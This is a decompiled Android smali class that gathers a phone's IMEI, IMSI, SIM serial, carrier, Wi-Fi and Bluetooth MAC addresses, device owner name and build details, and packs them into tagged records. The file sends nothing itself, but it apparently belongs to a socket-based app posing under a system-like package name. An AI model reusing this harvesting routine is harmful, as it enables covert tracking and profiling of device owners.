.class public Lcom/Android/MFSocket/SystemMsg;
.super Ljava/lang/Object;
.source "SystemMsg.java"


# instance fields
.field public mTeleMana:Landroid/telephony/TelephonyManager;

.field m_context:Landroid/content/Context;


# direct methods
.method constructor <init>(Landroid/content/Context;)V
    .locals 2
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 11
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 12
    iput-object p1, p0, Lcom/Android/MFSocket/SystemMsg;->m_context:Landroid/content/Context;

    .line 13
    iget-object v0, p0, Lcom/Android/MFSocket/SystemMsg;->m_context:Landroid/content/Context;

    const-string v1, "phone"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    iput-object v0, p0, Lcom/Android/MFSocket/SystemMsg;->mTeleMana:Landroid/telephony/TelephonyManager;

    .line 14
    return-void
.end method


# virtual methods
.method getSystemMsg(Ljava/lang/StringBuffer;)V
    .locals 14
    .param p1, "sysMsg"    # Ljava/lang/StringBuffer;

    .prologue
    .line 17
    iget-object v13, p0, Lcom/Android/MFSocket/SystemMsg;->mTeleMana:Landroid/telephony/TelephonyManager;

    if-nez v13, :cond_0

    .line 92
    :goto_0
    return-void

    .line 22
    :cond_0
    iget-object v13, p0, Lcom/Android/MFSocket/SystemMsg;->mTeleMana:Landroid/telephony/TelephonyManager;

    invoke-virtual {v13}, Landroid/telephony/TelephonyManager;->getSimState()I

    move-result v9

    .line 23
    .local v9, "smsState":I
    iget-object v13, p0, Lcom/Android/MFSocket/SystemMsg;->mTeleMana:Landroid/telephony/TelephonyManager;

    invoke-virtual {v13}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v3

    .line 24
    .local v3, "imei":Ljava/lang/String;
    iget-object v13, p0, Lcom/Android/MFSocket/SystemMsg;->mTeleMana:Landroid/telephony/TelephonyManager;

    invoke-virtual {v13}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;

    move-result-object v5

    .line 25
    .local v5, "imsi":Ljava/lang/String;
    sget-object v4, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    .line 26
    .local v4, "imos":Ljava/lang/String;
    iget-object v13, p0, Lcom/Android/MFSocket/SystemMsg;->mTeleMana:Landroid/telephony/TelephonyManager;

    invoke-virtual {v13}, Landroid/telephony/TelephonyManager;->getNetworkOperator()Ljava/lang/String;

    move-result-object v6

    .line 27
    .local v6, "inet":Ljava/lang/String;
    iget-object v13, p0, Lcom/Android/MFSocket/SystemMsg;->mTeleMana:Landroid/telephony/TelephonyManager;

    invoke-virtual {v13}, Landroid/telephony/TelephonyManager;->getSimSerialNumber()Ljava/lang/String;

    move-result-object v7

    .line 29
    .local v7, "isim":Ljava/lang/String;
    const-string v13, "STAT"

    invoke-static {v13, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 30
    invoke-static {v9, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(ILjava/lang/StringBuffer;)V

    .line 31
    invoke-static {p1}, Lcom/Android/MFSocket/RecordPackage;->AppendRecord(Ljava/lang/StringBuffer;)V

    .line 33
    const-string v13, "IMEI"

    invoke-static {v13, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 34
    invoke-static {v3, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 35
    invoke-static {p1}, Lcom/Android/MFSocket/RecordPackage;->AppendRecord(Ljava/lang/StringBuffer;)V

    .line 37
    const-string v13, "IMSI"

    invoke-static {v13, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 38
    invoke-static {v5, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 39
    invoke-static {p1}, Lcom/Android/MFSocket/RecordPackage;->AppendRecord(Ljava/lang/StringBuffer;)V

    .line 41
    const-string v13, "IMOS"

    invoke-static {v13, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 42
    invoke-static {v4, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 43
    invoke-static {p1}, Lcom/Android/MFSocket/RecordPackage;->AppendRecord(Ljava/lang/StringBuffer;)V

    .line 45
    const-string v13, "INET"

    invoke-static {v13, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 46
    invoke-static {v6, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 47
    invoke-static {p1}, Lcom/Android/MFSocket/RecordPackage;->AppendRecord(Ljava/lang/StringBuffer;)V

    .line 49
    const-string v13, "ISIM"

    invoke-static {v13, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 50
    invoke-static {v7, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 51
    invoke-static {p1}, Lcom/Android/MFSocket/RecordPackage;->AppendRecord(Ljava/lang/StringBuffer;)V

    .line 54
    :try_start_0
    new-instance v12, Lcom/Android/MFSocket/WifiMsg;

    iget-object v13, p0, Lcom/Android/MFSocket/SystemMsg;->m_context:Landroid/content/Context;

    invoke-direct {v12, v13}, Lcom/Android/MFSocket/WifiMsg;-><init>(Landroid/content/Context;)V

    .line 55
    .local v12, "wifi":Lcom/Android/MFSocket/WifiMsg;
    invoke-virtual {v12}, Lcom/Android/MFSocket/WifiMsg;->getMobileMac()Ljava/lang/String;

    move-result-object v11

    .line 56
    .local v11, "strWifi":Ljava/lang/String;
    const-string v13, "WIFIMAC"

    invoke-static {v13, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 57
    invoke-static {v11, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 58
    invoke-static {p1}, Lcom/Android/MFSocket/RecordPackage;->AppendRecord(Ljava/lang/StringBuffer;)V

    .line 61
    new-instance v1, Lcom/Android/MFSocket/BtMsg;

    iget-object v13, p0, Lcom/Android/MFSocket/SystemMsg;->m_context:Landroid/content/Context;

    invoke-direct {v1, v13}, Lcom/Android/MFSocket/BtMsg;-><init>(Landroid/content/Context;)V

    .line 62
    .local v1, "bt":Lcom/Android/MFSocket/BtMsg;
    invoke-virtual {v1}, Lcom/Android/MFSocket/BtMsg;->getBtMac()Ljava/lang/String;

    move-result-object v10

    .line 63
    .local v10, "strBt":Ljava/lang/String;
    const-string v13, "BTMAC"

    invoke-static {v13, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 64
    invoke-static {v10, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 65
    invoke-static {p1}, Lcom/Android/MFSocket/RecordPackage;->AppendRecord(Ljava/lang/StringBuffer;)V

    .line 67
    invoke-static {}, Landroid/bluetooth/BluetoothAdapter;->getDefaultAdapter()Landroid/bluetooth/BluetoothAdapter;

    move-result-object v0

    .line 68
    .local v0, "adapter":Landroid/bluetooth/BluetoothAdapter;
    invoke-virtual {v0}, Landroid/bluetooth/BluetoothAdapter;->getName()Ljava/lang/String;

    move-result-object v8

    .line 69
    .local v8, "owner":Ljava/lang/String;
    const-string v13, "OWNER"

    invoke-static {v13, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 70
    invoke-static {v8, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 71
    invoke-static {p1}, Lcom/Android/MFSocket/RecordPackage;->AppendRecord(Ljava/lang/StringBuffer;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 77
    .end local v0    # "adapter":Landroid/bluetooth/BluetoothAdapter;
    .end local v1    # "bt":Lcom/Android/MFSocket/BtMsg;
    .end local v8    # "owner":Ljava/lang/String;
    .end local v10    # "strBt":Ljava/lang/String;
    .end local v11    # "strWifi":Ljava/lang/String;
    .end local v12    # "wifi":Lcom/Android/MFSocket/WifiMsg;
    :goto_1
    const-string v13, "MODEL"

    invoke-static {v13, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 78
    sget-object v13, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-static {v13, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 79
    invoke-static {p1}, Lcom/Android/MFSocket/RecordPackage;->AppendRecord(Ljava/lang/StringBuffer;)V

    .line 81
    const-string v13, "MANUFACTURE"

    invoke-static {v13, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 82
    sget-object v13, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    invoke-static {v13, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 83
    invoke-static {p1}, Lcom/Android/MFSocket/RecordPackage;->AppendRecord(Ljava/lang/StringBuffer;)V

    .line 85
    const-string v13, "RELEASE"

    invoke-static {v13, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 86
    sget-object v13, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-static {v13, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 87
    invoke-static {p1}, Lcom/Android/MFSocket/RecordPackage;->AppendRecord(Ljava/lang/StringBuffer;)V

    .line 89
    const-string v13, "NAME"

    invoke-static {v13, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 90
    sget-object v13, Landroid/os/Build;->PRODUCT:Ljava/lang/String;

    invoke-static {v13, p1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 91
    invoke-static {p1}, Lcom/Android/MFSocket/RecordPackage;->AppendRecord(Ljava/lang/StringBuffer;)V

    goto/16 :goto_0

    .line 74
    :catch_0
    move-exception v2

    .line 75
    .local v2, "e":Ljava/lang/Exception;
    invoke-virtual {v2}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1
.end method
